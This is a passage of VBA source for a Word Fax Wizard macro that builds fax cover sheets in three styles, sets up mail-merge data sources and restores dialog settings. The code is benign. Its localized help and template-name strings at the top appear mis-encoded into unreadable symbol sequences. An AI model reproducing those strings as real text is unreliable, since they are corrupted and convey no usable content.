    rgstrAssistantMsg(iPANEL_RCPNTS) = "¦pªG±z´¿¥Î¹L¶Ç¯uºëÆF¡A«h¤U©Ô¦¡²M³æ¤è¶ô¤¤·|¦C¥X±z³Ìªñ¶Ç¯u¹Lªº¤å¥ó¦WºÙ¡C ±z¥i¥H¦b²M³æ¤¤¿ï¨ú¶Ç¯u¹Lªº¤å¥ó¡A±N¨äªþ¦b±zªº«Ê­±ªí³æ¤§«á¤@°_¶Ç¯u¥X¥h¡C"
    rgstrAssistantMsg(iPANEL_SENDER) = "½Ð¿é¤J±z·Q¼g¦b«Ê­±ªí³æ¤W¦³Ãö°e¥óªÌªº¸ê®Æ¡C"
    rgstrAssistantMsg(iPANEL_STYLE) = "½Ð¿ï¨ú±z«Ê­±ªí³æ©Ò­nªº®æ¦¡¡C¦b¶Ç¯u¤§«e¡A±zÁÙ¬O¥i¥H§ïÅÜ«Ê­±ªí³æªº¥~Æ[¡A©Î¬O¥[¤J¥²­nªºµù°O¡C"
    rgstrAssistantMsg(iMAX_PANEL) = "­n­×§ï¥ô¦ó³]©w¡A½Ð«ö¡u¤W¤@¨B¡v¡C"
    'if user is faxing a form letter, we have a different set of controls in the Recipients panel. So, we change the help text too.
    strAsstMsgRcpntsFormLtr = "½ÐÂI¨ú¡u©m¦W¡vÄæ¦ì¡A¦A¨Ó½ÐÂI¨ú¡u¶Ç¯u¹q¸Ü¡vÄæ¦ì¡A µM«á±q³q°T¿ý¤¤¿ï¨ú­n¥[¤Jªº¦¬¥ó¤H©Î¨ä¶Ç¯u¹q¸Ü¡C ±z¥i¥H¿ï¾Ü¶Ç¯uµ¹¨C¤@­Ó¤H©Î¬O«ü©w¥u¶Ç¯uµ¹¬Y¤H¡C"
    strAsstMsgRcpntsOrdDoc = "¦pªG±z´¿¥Î¹L¶Ç¯uºëÆF¡A¨º»ò¡u©m¦W¡vÄæ¦ìªº¤U©Ô¦¡²M³æ¤è¶ô¤¤·|¦³³Ìªñ¶Ç¯u¹ï¶Hªº¦W¦r¡C±z¥i¥H±q¤¤¿ï¨ú¦¬¥óªÌ©m¦W´¡¤J«Ê­±ªí³æ¤¤¡C"
    

    rgstrTemplateFileNames(iSTY_PROFESSIONAL, iLONG_NAME) = "±M·~¦¡¶Ç¯u.dot"
    rgstrTemplateFileNames(iSTY_PROFESSIONAL, iSHORT_NAME) = "cPrfax.dot"
    rgstrTemplateFileNames(iSTY_CONTEMPORARY, iLONG_NAME) = "²{¥N¦¡¶Ç¯u.dot"
    rgstrTemplateFileNames(iSTY_CONTEMPORARY, iSHORT_NAME) = "cCofax.dot"
    rgstrTemplateFileNames(iSTY_ELEGANT, iLONG_NAME) = "¨å¶®¦¡¶Ç¯u.dot"
    rgstrTemplateFileNames(iSTY_ELEGANT, iSHORT_NAME) = "cElfax.dot"
    
    rgstrNotes(iSTY_PROFESSIONAL) = "µù¸Ñ¡G"
    rgstrNotes(iSTY_CONTEMPORARY) = "µù¸Ñ¡G"
    rgstrNotes(iSTY_ELEGANT) = "µù¸Ñ¡G"
    
    ''**********************************************************************
    'DO NOT LOCALIZE BEYOND THIS POINT.
    ''******************************************************************************
    
    'initialize arrays with the color of the subway shapes for the panels
    For i = 0 To iMAX_PANEL
        rgfSkipPanel(i) = False
        rgiColorShape(i) = COLOR_LIGHTGREY
    Next i

    strBULLET = "•"""
    strSOFT_ENTER = Chr$(11)
    strQUOTE = Chr$(34)
                                        
    'DO NOT LOCALIZE THE NEXT STRING. WE WANT TO STORE ONLY ONE SET
    'OF DIALOG VALUES IN THE REGISTRY.
    strRegSettingsKey = strREG_SETTINGS_BASE_KEY & "Fax Wizard"
End Sub

'initialises the form
Private Sub InitForm()
    On Error GoTo FatalError
    
    Set formWizard = New formWizDlg
    If formWizard Is Nothing Then
        DisplayErrorMsg strERR_INIT_FORM
        ReportError Err
    End If

    iCurrentPanel = 0
    formWizard.lblWizardName1.Caption = " " & strWizLongName & " "
    Exit Sub

FatalError:
    DisplayErrorMsg strERR_INIT_FORM
    ReportError Err
    
End Sub

Sub InitWizard(fDummy As Boolean)
    
    InitForm
    InitWizardStrings

    fNoCovSht = False
    fStylesCopied = False
End Sub

Public Sub SetMainDoc(fDummy As Boolean)
Dim cDocs As Integer
Dim i As Integer

    On Error GoTo FatalError
    
    fDocIsFormLtr = False
    fDocPresent = False
    fDocChanged = False
    cDocs = Application.Documents.Count
    
    If cDocs > 1 Then
    'we don't want to add the doc. that was just created thro' FileNew
        For i = 2 To cDocs
            formWizard.cboDocList.AddItem Documents(i).Name
        Next i

        formWizard.cboDocList.ListIndex = 0
        fDocPresent = True
    Else
        'just one doc. i.e the freshly created one
        Set objMainDoc = Nothing
    End If
    Exit Sub

FatalError:
    ReportError Err

End Sub

'checks the kind of document and sets fDocIsFormLtr
Public Sub CheckDocKind(objDoc As Document)
Dim objMM As MailMerge
Dim strQueryString As String
    On Error GoTo LReturn
    fDocIsFormLtr = False
    Set objMM = objMainDoc.MailMerge
    Set objDataSrc = objMM.DataSource
    If objDataSrc.Type = wdNoMergeInfo Then GoTo LReturn
    strQueryString = objDataSrc.QueryString
    strFormLetterSQL = Left$(strQueryString, 255)
    strFormLetterSQL1 = Mid$(strQueryString, 256)
    strConnectString = objDataSrc.ConnectString
    fDocIsFormLtr = True
    
    Exit Sub
LReturn:
    Err.Clear
    fDocIsFormLtr = False
End Sub

Public Sub CreateCoverSheet(fDummy As Boolean)
Dim strDocName As String
Dim objFps As PageSetup

    On Error GoTo FatalError
    Application.StatusBar = strCREATING_DOC
    Application.ScreenUpdating = False
    
    System.Cursor = wdCursorWait

    If fChangeToA4 Then
        Set objFps = ActiveDocument.PageSetup
        objFps.LeftMargin = sA4_LEFT_MARGIN
        objFps.RightMargin = sA4_RIGHT_MARGIN
    ElseIf fChangeToLetter Then
        Set objFps = ActiveDocument.PageSetup
        objFps.LeftMargin = sLETTER_MARGIN
        objFps.RightMargin = sLETTER_MARGIN
    End If
    
    If (((Not (fDocIsFormLtr)) And (iNumRcpnts > 1)) Or fDocIsFormLtr) Then _
        CreateDataSource
        
    StatusBar = strCREATING_DOC
    Select Case iFaxStyle
    Case iSTY_PROFESSIONAL
        CreateProfContCoverSheet
    Case iSTY_CONTEMPORARY
        CreateProfContCoverSheet
    Case iSTY_ELEGANT
        CreateElegCoverSheet
    End Select
    
    If (fDocPresent) And (Not (formWizard.optCovSht.Value)) Then
        strDocName = ActiveWindow.Caption & " - " & objMainDoc.Name & strWINDOW_CAPTION
    Else
        strDocName = ActiveWindow.Caption & strCOVER_SHEET_CAPTION
    End If
        
    With ActiveWindow
        .Caption = strDocName

        .View.TableGridlines = False
    End With
    ActiveDocument.UndoClear
    Selection.HomeKey wdStory
    
    With ActiveDocument.Content
        .SpellingChecked = True
        .GrammarChecked = True
    End With
    
    Exit Sub
    
FatalError:
    ReportError Err
End Sub

'creates a data source for the cover sheet in the temp. directory
Private Sub CreateDataSource()
Dim objRng As Range
Dim strPath As String
Dim objDataSrcDoc As Document, objMM As MailMerge
Dim strDataSrcName As String
    On Error GoTo FatalError
    
    Set objMM = ActiveDocument.MailMerge
    objMM.MainDocumentType = wdFormLetters
    
    If (fDocIsFormLtr) Then
        objMM.OpenDataSource objDataSrc.Name, Connection:=strConnectString
        objMM.DataSource.QueryString = strFormLetterSQL & strFormLetterSQL1
        Exit Sub
    End If
    
    Set objDataSrcDoc = Application.Documents.Add
    
    Set objRng = objDataSrcDoc.Content
    
    CreateTableFromFaxInfo objRng
    
    strPath = Options.DefaultFilePath(wdTempFilePath)
    If Right$(strPath, 1) <> strPathSeparator Then _
        strPath = strPath & strPathSeparator
        
    strDataSrcName = strPath & "~$CovSht@" & Format$(Date, "dd-mm-yy") & "," & Format$(Time, "hh-mm-ss") & ".tmp"
    objDataSrcDoc.SaveAs strDataSrcName, wdFormatDocument
    objDataSrcDoc.Close wdDoNotSaveChanges
    
    'attach the data source doc. to activedocument (cover sheet)
    objMM.OpenDataSource strDataSrcName
    
    Exit Sub
FatalError:
    ReportError Err
End Sub


'creates a table in the data source document with names and numbers
'the format of the table is just like how one would create a data source doc.
'through Word
Private Sub CreateTableFromFaxInfo(objRange As Range)
Dim strText As String
Dim i As Integer

    On Error GoTo FatalError

    strText = strFLD_FAX_NAME & vbCr & strFLD_FAX_NUMBER
    
    'collect the names and numbers entered by the user
    For i = 1 To iNumRcpnts
        strText = strText & vbCr & rgstrRcpntFaxNames(i - 1) & vbCr & rgstrRcpntFaxNums(i - 1)
    Next i

    objRange.InsertBefore strText
    'Add a table with 2 columns and iNumRcpnts+1 rows
    objRange.Select
    Selection.ConvertToTable vbCr, iNumRcpnts + 1, 2
    
    Exit Sub
FatalError:
    ActiveDocument.Close wdDoNotSaveChanges 'close the data source doc.
    ReportError Err
End Sub

Public Function FCopyStyles(iStyle As Integer) As Boolean
    Dim strStyleName As String
    Dim strLongName As String
    Dim i As Integer
    
    On Error GoTo TemplateNotFound
LFindTemplate:
    ' Attempt to locate longname, then shortname template file
    i = iLONG_NAME
    strStyleName = strTemplatePath & rgstrTemplateFileNames(iStyle, iLONG_NAME)
    strLongName = strStyleName
    If Dir(strStyleName) <> "" Then GoTo LApplyStyles
LTryShortName:
    i = iSHORT_NAME
    strStyleName = strTemplatePath & rgstrTemplateFileNames(iStyle, iSHORT_NAME)

LApplyStyles:
    StatusBar = strAPPLYING
    
    ' Get styles
    ActiveDocument.CopyStylesFromTemplate (strStyleName)
    
    ' No Error
    fStylesCopied = True
    StatusBar = ""
    FCopyStyles = True
    Exit Function
    
TemplateNotFound:
    If i = iLONG_NAME Then
        i = iSHORT_NAME
        Err.Clear
        GoTo LTryShortName
    End If
    DisplayErrorMsg strERR_STYLE_NOT_FOUND & strLongName & strERR_STYLE_NOT_FOUND2
    fStylesCopied = False
    StatusBar = ""
    FCopyStyles = False
End Function

'creates professional/Contemporary style cover sheet
Private Sub CreateProfContCoverSheet()
Dim objRngBuffer1 As Range
Dim objRngBuffer2 As Range
Dim strCmpnyName As String, strName As String
Dim strMFFirstName As String, strMFLastName As String, strMFFaxNum As String
Dim objRngTextTable As Range
Dim objTable As Table

    On Error GoTo FatalError
    
    If iFaxStyle = iSTY_CONTEMPORARY Then
        InsertContAutoText
        objActiveRange.Collapse wdCollapseEnd
    End If
    
    InsertReturnAddress
    GetMergeFieldNames strMFFirstName, strMFLastName, strMFFaxNum
    
    'Insert company name
    strCmpnyName = formWizard.txtCompany.Text
    If (iFaxStyle = iSTY_PROFESSIONAL) Then
        If (Len(strCmpnyName)) Then
            objActiveRange.Style = strSTY_COMPANY_NAME
            objActiveRange.InsertBefore strCmpnyName & vbCr
            objActiveRange.Collapse wdCollapseEnd
        End If
        'Insert title
        objActiveRange.Style = strSTY_DOC_LABEL
        objActiveRange.InsertBefore rgstrFaxTitle(iFaxStyle) & vbCr
        objActiveRange.Collapse wdCollapseEnd
    End If
    

    
    Set objRngTextTable = objActiveRange.Duplicate
    
'the topics To: and From: have a character style which has to be
'applied after the data has been written (since the data have a
'different style). so, use a range buffer
    
    '1st line text has style "Message Header First". The subsequent
    'lines have "Message Header"
    
    'Insert To:
    objActiveRange.Style = strSTY_MSG_HDR_FIRST
    objActiveRange.InsertBefore strTO
    Set objRngBuffer1 = objActiveRange.Duplicate

    'insert recipient name
    If (iNumRcpnts = 1) And (Not (fDocIsFormLtr)) Then
        objActiveRange.InsertAfter vbTab & rgstrRcpntFaxNames(0) & vbTab
    Else
        'insert appropriate field
        objActiveRange.InsertAfter vbTab
        objActiveRange.Collapse wdCollapseEnd
        If ((iNumRcpnts > 1) Or (fDocIsFormLtr)) Then
            InsertField objActiveRange, wdFieldMergeField, strMFFirstName, True
            If Len(strMFLastName) Then
                objActiveRange.InsertAfter strSPACE
                objActiveRange.Collapse wdCollapseEnd
                InsertField objActiveRange, wdFieldMergeField, strMFLastName, True
            End If
        Else
            InsertField objActiveRange, wdFieldMacroButton, strEMPTY_MACRO & strCLICK_HERE_NAME, False
        End If
        objActiveRange.InsertAfter vbTab
    End If
    
    objActiveRange.Collapse wdCollapseEnd
    
    'Insert From:
    objActiveRange.InsertBefore strFROM
    Set objRngBuffer2 = objActiveRange.Duplicate
    
    'insert sender's name
    strName = formWizard.txtSenderName.Text
    If Len(strName) Then
        objActiveRange.InsertAfter vbTab & strName & vbCr
    Else
        objActiveRange.InsertAfter vbTab
        objActiveRange.Collapse wdCollapseEnd
        'insert macrobutton field.
        InsertField objActiveRange, wdFieldMacroButton, strEMPTY_MACRO & strCLICK_HERE_NAME, False
        objActiveRange.InsertParagraphAfter
    End If
    objActiveRange.Collapse wdCollapseEnd
    'set character style for topics
    objRngBuffer1.Style = strSTY_MSG_HDR_LABEL
    objRngBuffer2.Style = strSTY_MSG_HDR_LABEL
    
    'next 3 lines in "Message Header" style
    'Insert Fax Number
    objActiveRange.Style = wdStyleMessageHeader
    
    objActiveRange.InsertBefore strFAX
    Set objRngBuffer1 = objActiveRange.Duplicate

    If (iNumRcpnts = 1) And (Not (fDocIsFormLtr)) Then
        objActiveRange.InsertAfter vbTab & rgstrRcpntFaxNums(0) & vbTab
    Else
        objActiveRange.InsertAfter vbTab
        objActiveRange.Collapse wdCollapseEnd
        'insert the appropriate field
        If ((iNumRcpnts > 1) Or (fDocIsFormLtr)) Then
            InsertField objActiveRange, wdFieldMergeField, strMFFaxNum, True
        Else
            InsertField objActiveRange, wdFieldMacroButton, strEMPTY_MACRO & strCLICK_HERE_FAX_NUMBER, False
        End If
        objActiveRange.InsertAfter vbTab
    End If
    
    objActiveRange.Collapse wdCollapseEnd
    
    'Insert Date
    objActiveRange.InsertBefore strDATE
    Set objRngBuffer2 = objActiveRange.Duplicate
    objActiveRange.InsertAfter vbTab
    objActiveRange.Collapse wdCollapseEnd
    'insert datefield
    InsertField objActiveRange, wdFieldTime, "\@ " & strQUOTE & strDATE_FORMAT & strQUOTE, True

    objActiveRange.InsertParagraphAfter
    objActiveRange.Collapse wdCollapseEnd
    'set character style for topics
    objRngBuffer1.Style = strSTY_MSG_HDR_LABEL
    objRngBuffer2.Style = strSTY_MSG_HDR_LABEL
    
    
    'Next line
    'Insert Phone
    objActiveRange.InsertBefore strPHONE
    Set objRngBuffer1 = objActiveRange.Duplicate
    objActiveRange.InsertAfter vbTab
    objActiveRange.Collapse wdCollapseEnd
    InsertField objActiveRange, wdFieldMacroButton, strEMPTY_MACRO & strCLICK_HERE_PHONE_NUMBER, False
    objActiveRange.InsertAfter vbTab
    objActiveRange.Collapse wdCollapseEnd
    
    'Insert Pages:
    objActiveRange.InsertBefore strPAGES
    Set objRngBuffer2 = objActiveRange.Duplicate
    objActiveRange.InsertAfter vbTab
    objActiveRange.Collapse wdCollapseEnd

    InsertField objActiveRange, wdFieldMacroButton, strEMPTY_MACRO & strCLICK_HERE_PAGES, False
    objActiveRange.InsertParagraphAfter
    objActiveRange.Collapse wdCollapseEnd
    'set character style for topics
    objRngBuffer1.Style = strSTY_MSG_HDR_LABEL
    objRngBuffer2.Style = strSTY_MSG_HDR_LABEL
    
    'Insert Re:
    objActiveRange.InsertBefore strRE
    Set objRngBuffer1 = objActiveRange.Duplicate
    objActiveRange.InsertAfter vbTab
    objActiveRange.Collapse wdCollapseEnd
    InsertField objActiveRange, wdFieldMacroButton, strEMPTY_MACRO & strCLICK_HERE_SUBJECT, False
    objActiveRange.InsertAfter vbTab
    objActiveRange.Collapse wdCollapseEnd
    
    'Insert CC:
    objActiveRange.InsertBefore strCC
    Set objRngBuffer2 = objActiveRange.Duplicate
    objActiveRange.InsertAfter vbTab
    objActiveRange.Collapse wdCollapseEnd
    InsertField objActiveRange, wdFieldMacroButton, strEMPTY_MACRO & strCLICK_HERE_NAME, False

    objActiveRange.Collapse wdCollapseEnd
    'set character style for topics
    objRngBuffer1.Style = strSTY_MSG_HDR_LABEL
    objRngBuffer2.Style = strSTY_MSG_HDR_LABEL
    
    'convert the text into a table
    objRngTextTable.End = objActiveRange.End
    objRngTextTable.Select
    Set objTable = Selection.ConvertToTable(vbTab, 4, 4, AutoFit:=True, Format:=0)
    With objTable
        .Borders.Enable = False
        .Rows.SpaceBetweenColumns = 0
        If iFaxStyle = iSTY_CONTEMPORARY Then
            .Rows.LeftIndent = sCONT_LEFT_INDENT
        Else 'for professional style.
        'contemporary has autotext entry to insert the lines.
            Selection.Cells.AutoFit
            .Columns(2).Width = sCONT_WIDTH_COL1
            .Columns(4).Width = sCONT_WIDTH_COL1
            .Rows.Borders(wdBorderHorizontal).Visible = True
            .Borders(wdBorderBottom).Visible = True
        End If
    End With
    'convert to table inserts a vbCr after the table.
    InsertCheckBoxes
    InsertBodyText
    
    If iFaxStyle = iSTY_CONTEMPORARY Then
        Set objActiveRange = ActiveDocument.Content
        objActiveRange.Collapse wdCollapseStart
        'Insert title
        objActiveRange.Style = strSTY_DOC_LABEL
        objActiveRange.InsertBefore rgstrFaxTitle(iFaxStyle) ' & vbCr
    '    objActiveRange.Collapse wdCollapseEnd
    End If
    Exit Sub
FatalError:
    ReportError Err
End Sub
'creates an elegant style cover sheet
Private Sub CreateElegCoverSheet()
Dim objRngBuffer1 As Range
Dim objRngBuffer2 As Range
Dim strCmpnyName As String, strName As String
Dim strMFFirstName As String, strMFLastName As String, strMFFaxNum As String
Dim objRngTextTable As Range
Dim objTable As Table, objRow As Row
Dim i As Integer

    On Error GoTo FatalError
    
    InsertReturnAddress
    
    GetMergeFieldNames strMFFirstName, strMFLastName, strMFFaxNum
    
    'Insert company name
    strCmpnyName = formWizard.txtCompany.Text
    If (Len(strCmpnyName)) Then
        objActiveRange.Style = strSTY_COMPANY_NAME
        objActiveRange.InsertBefore strCmpnyName & vbCr
        objActiveRange.Collapse wdCollapseEnd
    End If
    
    'Insert title
    objActiveRange.Style = strSTY_DOC_LABEL
    objActiveRange.InsertBefore rgstrFaxTitle(iFaxStyle) & vbCr
    objActiveRange.Collapse wdCollapseEnd
    
    Set objRngTextTable = objActiveRange.Duplicate
        
'the topics To: and From: have a character style which has to be
'applied after the data has been written (since the data have a
'different style). so, use a range buffer
    
    '1st line text has style "Message Header First". The subsequent
    'lines have "Message Header"
    
    'Insert To: & From:
    objActiveRange.Style = strSTY_MSG_HDR_FIRST
    
    objActiveRange.InsertBefore strTO & vbTab & strFROM
    Set objRngBuffer1 = objActiveRange.Duplicate
    objActiveRange.InsertAfter strSOFT_ENTER
    objActiveRange.Collapse wdCollapseEnd
    'Insert textual information in the next line
    If (iNumRcpnts > 1) Or fDocIsFormLtr Then
        InsertField objActiveRange, wdFieldMergeField, strMFFirstName, True 'Preserveformatting
        If Len(strMFLastName) Then
            objActiveRange.InsertAfter strSPACE
            objActiveRange.Collapse wdCollapseEnd
            InsertField objActiveRange, wdFieldMergeField, strMFLastName, True
        End If
    ElseIf iNumRcpnts = 1 Then
        objActiveRange.InsertBefore rgstrRcpntFaxNames(0)
    Else
        InsertField objActiveRange, wdFieldMacroButton, strEMPTY_MACRO & strCLICK_HERE_NAME, False
    End If
    
    'insert name
    strName = formWizard.txtSenderName.Text
    If Len(strName) Then
        objActiveRange.InsertAfter vbTab & strName & vbCr
    Else
        objActiveRange.InsertAfter vbTab
        objActiveRange.Collapse wdCollapseEnd
        InsertField objActiveRange, wdFieldMacroButton, strEMPTY_MACRO & strCLICK_HERE_NAME, False
        objActiveRange.InsertParagraphAfter
    End If

    objActiveRange.Collapse wdCollapseEnd
    'set character style for topics
    objRngBuffer1.Style = strSTY_MSG_HDR_LABEL

    'next 3 lines in "Message Header" style
    'Insert FaxNumber and Date
    objActiveRange.Style = wdStyleMessageHeader
    
    objActiveRange.InsertBefore strFAX_NUMBER & vbTab & strDATE
    Set objRngBuffer1 = objActiveRange.Duplicate
    objActiveRange.InsertAfter strSOFT_ENTER
    objActiveRange.Collapse wdCollapseEnd
    'Insert textual information in the next line
    
    'insert recipient number
    If (iNumRcpnts > 1) Or fDocIsFormLtr Then
        InsertField objActiveRange, wdFieldMergeField, strMFFaxNum, True 'Preserveformatting
    ElseIf iNumRcpnts = 1 Then
        objActiveRange.InsertBefore rgstrRcpntFaxNums(0)
    Else
        InsertField objActiveRange, wdFieldMacroButton, strEMPTY_MACRO & strCLICK_HERE_FAX_NUMBER, False
    End If
    objActiveRange.InsertAfter vbTab
    objActiveRange.Collapse wdCollapseEnd
    
    'insert datefield
    InsertField objActiveRange, wdFieldTime, "\@ " & strQUOTE & strDATE_FORMAT & strQUOTE, True
    objActiveRange.InsertParagraphAfter
    objActiveRange.Collapse wdCollapseEnd
    'set character style for topics
    objRngBuffer1.Style = strSTY_MSG_HDR_LABEL
    
    'Insert CompanyName & Pages
    objActiveRange.InsertBefore strCOMPANY & vbTab & strTOTAL_NO_PAGES
    Set objRngBuffer1 = objActiveRange.Duplicate
    objActiveRange.InsertAfter strSOFT_ENTER
    objActiveRange.Collapse wdCollapseEnd
    'Insert company name
    InsertField objActiveRange, wdFieldMacroButton, strEMPTY_MACRO & strCLICK_HERE_COMPANY, False 'PreserveFormatting
    objActiveRange.InsertAfter vbTab
    objActiveRange.Collapse wdCollapseEnd

    InsertField objActiveRange, wdFieldMacroButton, strEMPTY_MACRO & strCLICK_HERE_PAGES, False 'PreserveFormatting
    objActiveRange.InsertParagraphAfter
    objActiveRange.Collapse wdCollapseEnd

    objRngBuffer1.Style = strSTY_MSG_HDR_LABEL
    
    'Phone Number & Re:
    objActiveRange.InsertBefore strPHONE_NUMBER & vbTab & strRE
    Set objRngBuffer1 = objActiveRange.Duplicate
    objActiveRange.InsertAfter strSOFT_ENTER
    objActiveRange.Collapse wdCollapseEnd
    
    InsertField objActiveRange, wdFieldMacroButton, strEMPTY_MACRO & strCLICK_HERE_PHONE_NUMBER, False 'PreserveFormatting
    objActiveRange.InsertAfter vbTab
    objActiveRange.Collapse wdCollapseEnd

    InsertField objActiveRange, wdFieldMacroButton, strEMPTY_MACRO & strCLICK_HERE_SUBJECT, False 'PreserveFormatting
    objActiveRange.InsertParagraphAfter
    objActiveRange.Collapse wdCollapseEnd

    objRngBuffer1.Style = strSTY_MSG_HDR_LABEL
    
    'set character style for topics
    objRngBuffer1.Style = strSTY_MSG_HDR_LABEL
    
    'convert the text into a table
    objRngTextTable.End = objActiveRange.End '- 1 'don't want the last CR
    objRngTextTable.Select
    Set objTable = Selection.ConvertToTable(vbTab, 10, 2, Format:=0)
    objTable.Borders.Enable = False
    
    For i = 2 To 8 Step 2
        Set objRow = objTable.Rows(i)
        objRow.Range.ParagraphFormat.LeftIndent = 0.25 * 72
        'don't need the bottom border for the last row.
        If i <> 8 Then objRow.Borders(wdBorderBottom) = True
    Next i
    
    InsertCheckBoxes
    InsertBodyText
    
    Exit Sub
FatalError:
    ReportError Err
End Sub

'Get the names of the merge fields to be inserted in the cover sheet
'If the original doc. is a form letter then we need to insert the merge fields
'selected by the user. If not then insert the merge field names we created in the
'data source we created
Private Sub GetMergeFieldNames(strFirstName As String, strLastName As String, strFaxNum As String)
    On Error GoTo FatalError
    
    If (fDocIsFormLtr) Then
        'user selects names from drop-down of all possible mergefields in data source
        strFirstName = formWizard.cboFldsRcpntFirstName.Text
        strLastName = formWizard.cboFldsRcpntLastName.Text
        If (strLastName = strNONE) Then strLastName = ""
        strFaxNum = formWizard.cboFldsFaxNum.Text
    Else
       strFirstName = strFLD_FAX_NAME
       strLastName = ""
       strFaxNum = strFLD_FAX_NUMBER
    End If
    
    Exit Sub
FatalError:
    ReportError Err
End Sub
Private Sub InsertReturnAddress()
Dim strFromPh As String
Dim strFromFax As String
Dim strText As String, strAddress As String

    On Error GoTo FatalError
    
    'Set objActiveRange = ActiveDocument.Content
    'If iFaxStyle = iSTY_CONTEMPORARY Then objActiveRange.Collapse wdCollapseEnd

    strFromPh = formWizard.txtSenderPhone.Text
    strFromFax = formWizard.txtSenderFax.Text
    strAddress = formWizard.txtMailingAddr.Text

    Select Case iFaxStyle
    
    Case iSTY_CONTEMPORARY, iSTY_PROFESSIONAL
        strText = strAddress
        If Len(strText) Then strText = strText & vbCr
        If Len(strFromPh) <> 0 Then _
            strText = strText & strPHONE & strSPACE & strFromPh & vbCr

        If Len(strFromFax) <> 0 Then _
            strText = strText & strFAX & strSPACE & strFromFax & vbCr
        If Len(strText) = 0 Then strText = strText & vbCr
    Case iSTY_ELEGANT
        strText = StrReplaceCrLfWithText(strAddress, strSPACE & strBULLET & strSPACE)
        If Len(strText) Then strText = strText & vbCr
        'if you have phone number
        If Len(strFromPh) <> 0 Then
            strText = strText & strPHONE & strSPACE & strFromPh
            'check if you also have fax
            'instead of vbCr use space, bullet, space combination
            If Len(strFromFax) <> 0 Then _
                strText = strText & strSPACE & strBULLET & strSPACE & strFAX & strSPACE & strFromFax
            strText = strText & vbCr
        'check if you have only Fax
        ElseIf Len(strFromFax) <> 0 Then
            strText = strText & strFAX & strSPACE & strFromFax & vbCr
        End If
        
    End Select
    
    objActiveRange.Style = strSTY_RETURN_ADDR
    objActiveRange.InsertBefore strText
    objActiveRange.Collapse wdCollapseEnd
    Exit Sub
    
FatalError:
    ReportError Err
End Sub
'Inserts the check-boxes and the text associated with them
Private Sub InsertCheckBoxes()
Dim i As Integer
Dim R1 As Range
    On Error GoTo FatalError
    objActiveRange.Style = strSTY_MSG_HDR_LAST
    objActiveRange.Collapse wdCollapseEnd
    Set R1 = objActiveRange.Duplicate

    Set R1 = objWizTemplate.AutoTextEntries(strAT_UNCHKD_BOX).Insert(R1)

    objActiveRange.End = R1.End + 1
    objActiveRange.Start = R1.End + 1
    objActiveRange.InsertAfter strSPACE + rgstrChkBoxText(1) + vbTab
    objActiveRange.Style = wdStyleEmphasis

    objActiveRange.Collapse wdCollapseEnd
    For i = 2 To 5
        objActiveRange.FormattedText = R1.FormattedText
        objActiveRange.Collapse wdCollapseEnd
        objActiveRange.InsertAfter strSPACE + rgstrChkBoxText(i) + vbTab
        objActiveRange.Style = wdStyleEmphasis
        objActiveRange.Collapse wdCollapseEnd
    Next i

    'delete the previous character i.e the last tab
    objActiveRange.Start = objActiveRange.End - 1
    objActiveRange.Delete
    objActiveRange.InsertParagraph
    objActiveRange.Collapse wdCollapseEnd
    Exit Sub
    
FatalError:
    ReportError Err
End Sub

Private Sub InsertBodyText()
Dim R1 As Range
Dim strAfterText As String
    On Error GoTo FatalError
    
    If iFaxStyle = iSTY_ELEGANT Then
        strAfterText = vbCr
    Else
        strAfterText = strSPACE & strSPACE
    End If

    
    If iFaxStyle = iSTY_PROFESSIONAL Then _
        objActiveRange.InsertAfter strBULLET

    objActiveRange.InsertAfter rgstrNotes(iFaxStyle) & strAfterText
    
    Set R1 = objActiveRange.Duplicate
    objActiveRange.Collapse wdCollapseEnd

    InsertField objActiveRange, wdFieldMacroButton, strEMPTY_MACRO & strCLICK_HERE_COMMENTS, False 'PreserveFormatting
    objActiveRange.Style = wdStyleBodyText
    R1.Style = strSTY_MSG_HDR_LABEL
    
    Exit Sub
FatalError:
    ReportError Err
End Sub
Private Sub InsertContAutoText()

    On Error GoTo FatalError
    Set objActiveRange = objWizTemplate.AutoTextEntries(strCNTMPGFX2).Insert(objActiveRange, True)
   
    Exit Sub
FatalError:
    DisplayErrorMsg strERR_AUTOTEXT_NOT_FOUND
End Sub


Public Sub RestoreDialogValues(fDummy As Boolean)
    Dim fAddrBkEnable As Boolean
    Dim i As Integer
    Dim strChkdAddr As String
    
    On Error GoTo FatalError
    StatusBar = strRST_SETTINGS
    Application.ScreenUpdating = False
    System.Cursor = wdCursorWait
   
    fAddrBkEnable = Application.MAPIAvailable
    formWizard.cmdRcpntsAddrBk.Enabled = fAddrBkEnable
    formWizard.cmdSenderAddrBk.Enabled = fAddrBkEnable
    
'Setting options in Panel1 depending on whether a doc. is present or not
    If fDocPresent Then
        formWizard.optCurDoc.Value = True
        formWizard.optCurDocCovShtYes.Value = True
    Else
        'disable a bunch of options
        formWizard.optCurDoc.Enabled = False
        formWizard.cboDocList.Enabled = False
        formWizard.optCurDocCovShtNo.Enabled = False
        formWizard.optCurDocCovShtYes.Enabled = False
        formWizard.optCovSht.Value = True
        formWizard.frmRcpntsFormDoc.Visible = False
        formWizard.frmRcpntsOrdDoc.Visible = True
    
    End If

    'Panel2
    'read values from registry.
    iFaxOption = IRestorePref("Fax Option", 0)
    If InStr(UCase$(System.OperatingSystem), "NT") Then
        fMSFAXEnabled = False
        formWizard.optMSFax.Enabled = False
    Else
        fMSFAXEnabled = True
    End If
    'set printer in combo-box before disabling frmFaxDriver.
    GetAllPrinters
        
    'the controls are assumed to be enabled initially and are explicityly
    'only turned off, never turned on.
    If (iFaxOption = iMS_FAX) And Not (fMSFAXEnabled) Then
        If iTotalNumPrinters > 0 Then
            iFaxOption = iDIFF_FAX
        Else
            iFaxOption = iNO_FAX
        End If
    End If
    Select Case iFaxOption
        Case iMS_FAX:
            formWizard.optMSFax.Value = True
            formWizard.cboFaxDriver.Enabled = False
            formWizard.lblFaxDriver.Enabled = False
            formWizard.cmdOtherPrinters.Enabled = False
        Case iDIFF_FAX:
            formWizard.optDifferentFax.Value = True
        Case iNO_FAX:
            formWizard.optNoFax.Value = True
            formWizard.cboFaxDriver.Enabled = False
            formWizard.lblFaxDriver.Enabled = False
            formWizard.cmdOtherPrinters.Enabled = False
        Case Else
            iFaxOption = iNO_FAX
            formWizard.optNoFax.Value = True
            formWizard.cboFaxDriver.Enabled = False
            formWizard.lblFaxDriver.Enabled = False
            formWizard.cmdOtherPrinters.Enabled = False
            
    End Select
    
    'Panel3
    fRegistryNamesRead = False
    
    'Panel5
    formWizard.txtSenderName.Text = Application.UserName

    i = ICountLines(Application.UserAddress, strChkdAddr, iMAX_ADDR_LINES)
    formWizard.txtMailingAddr.Text = strChkdAddr
